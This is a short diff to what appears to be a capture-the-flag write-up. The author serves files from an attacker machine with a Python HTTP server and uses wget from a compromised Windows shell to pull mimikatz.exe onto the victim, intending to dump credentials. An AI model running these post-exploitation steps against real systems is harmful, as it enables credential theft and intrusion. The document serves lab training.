@@ -782,3 +782,26 @@ Now i have a shell as this user!
 
 As opposed to exfiltrating these files ill use mimikatz to do this
 
+```python
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+Ill host it on my system
+
+```python
+PS C:\Users\PPotts\Documents> wget http://10.10.14.90:8000/mimikatz.exe -o mimikatz.exe
+PS C:\Users\PPotts\Documents> dir
+
+
+    Directory: C:\Users\PPotts\Documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          5/9/2023   2:16 PM                WindowsPowerShell                                                    
+-a----         5/12/2026   9:10 PM        1355264 mimikatz.exe                                                         
+
+
+PS C:\Users\PPotts\Documents> 
+```
+N
